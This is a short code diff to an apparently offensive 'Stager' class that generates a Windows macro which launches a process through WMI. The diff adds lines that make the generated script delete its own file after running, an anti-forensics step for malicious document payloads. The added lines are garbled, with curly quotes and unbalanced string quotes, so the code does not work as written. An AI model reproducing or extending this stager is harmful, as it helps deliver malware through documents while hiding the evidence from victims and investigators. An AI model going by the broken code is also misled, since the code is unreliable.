@@ -152,5 +152,8 @@ class Stager:
             macro += "\tSet objProcess = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2:Win32_Process\")\n"
             macro += "\tobjProcess.Create "+Str+" , Null, objConfig, intProcessID\n"
             macro += "End Function\n"
-
+	    macro+="Set objFSO = CreateObject(“Scripting.FileSystemObject”)\n"
+	    macro+=strScript = Wscript.ScriptFullName\n"
+            macro+=objFSO.DeleteFile(strScript)\"\n"
+	    
             return macro
